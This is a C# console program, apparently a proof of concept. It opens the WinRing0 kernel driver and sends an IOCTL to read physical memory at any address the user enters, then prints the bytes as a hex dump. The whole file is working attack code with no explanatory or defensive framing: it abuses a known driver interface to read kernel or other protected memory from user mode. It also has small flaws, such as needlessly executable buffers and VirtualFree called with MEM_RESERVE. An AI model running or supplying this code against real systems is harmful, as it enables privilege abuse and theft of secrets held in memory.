using System;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    // Required Win32 constants and structures
    const uint GENERIC_READ = 0x80000000;
    const uint GENERIC_WRITE = 0x40000000;
    const uint OPEN_EXISTING = 3;
    const uint IOCTL_REQUEST = 0x9C406104;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        IntPtr lpInBuffer,
        uint nInBufferSize,
        IntPtr lpOutBuffer,
        uint nOutBufferSize,
        ref uint lpBytesReturned,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetLastError();

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        Console.Write("Enter the memory address to read from (in hexadecimal): ");
        string addressInput = Console.ReadLine();
        if (!uint.TryParse(addressInput, System.Globalization.NumberStyles.HexNumber, null, out uint physicalMemAddr))
        {
            Console.WriteLine("[!] Invalid memory address format.");
            return;
        }

        uint dwDataSizeToRead = 0x4;       // Size of data to read in bytes
        uint dwAmountOfDataToRead = 8;     // Number of data chunks to read
        uint dwBytesReturned = 0;

        string devicePath = @"\\.\WinRing0_1_2_0";
        IntPtr hDevice = CreateFile(devicePath, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

        if (hDevice == IntPtr.Zero || hDevice == (IntPtr)(-1))
        {
            uint errorCode = GetLastError();
            Console.WriteLine($"[!] Failed to open handle to the driver. Error code: {errorCode} ({errorCode:X})");
            return;
        }

        Console.WriteLine("[+] Opened a handle to the driver!");

        IntPtr lpInBuffer = VirtualAlloc(IntPtr.Zero, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        IntPtr lpOutBuffer = VirtualAlloc(IntPtr.Zero, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (lpInBuffer == IntPtr.Zero || lpOutBuffer == IntPtr.Zero)
        {
            uint errorCode = GetLastError();
            Console.WriteLine($"[!] Failed to allocate memory buffers. Error code: {errorCode} ({errorCode:X})");
            return;
        }

        Console.WriteLine("[-] Populating input buffer...");

        Marshal.WriteInt32(lpInBuffer, (int)physicalMemAddr);
        Marshal.WriteInt32((IntPtr)((long)lpInBuffer + 0x8), (int)dwDataSizeToRead);
        Marshal.WriteInt32((IntPtr)((long)lpInBuffer + 0xC), (int)dwAmountOfDataToRead);

        Console.WriteLine($"[-] Sending IOCTL 0x{IOCTL_REQUEST:X8}...");

        bool success = DeviceIoControl(
            hDevice,
            IOCTL_REQUEST,
            lpInBuffer,
            0x10,
            lpOutBuffer,
            0x40,
            ref dwBytesReturned,
            IntPtr.Zero);

        if (!success)
        {
            uint errorCode = GetLastError();
            Console.WriteLine($"[!] IOCTL request failed. Error code: {errorCode} ({errorCode:X})");
            CloseHandle(hDevice);
            return;
        }

        Console.WriteLine($"\n[+] Dumping {dwDataSizeToRead * dwAmountOfDataToRead} bytes of data from 0x{physicalMemAddr:X}");
        Console.WriteLine(new string('-', 70));

        for (int nSize = 0; nSize < dwDataSizeToRead * dwAmountOfDataToRead; nSize += 0x10)
        {
            for (int i = 0; i <= 0xF; i++)
            {
                byte dataByte = Marshal.ReadByte((IntPtr)((long)lpOutBuffer + nSize + i));
                Console.Write($"{dataByte:X2} ");
            }
            Console.Write("  ");
            for (int i = 0; i <= 0xF; i++)
            {
                byte dataByte = Marshal.ReadByte((IntPtr)((long)lpOutBuffer + nSize + i));
                if (dataByte >= 0x20 && dataByte <= 0x7E)
                    Console.Write((char)dataByte);
                else
                    Console.Write('.');
            }
            Console.WriteLine();
        }
        Console.WriteLine(new string('-', 70));

        VirtualFree(lpInBuffer, 0, MEM_RESERVE);
        VirtualFree(lpOutBuffer, 0, MEM_RESERVE);
        CloseHandle(hDevice);

        Console.WriteLine("[+] Done.");
    }
}
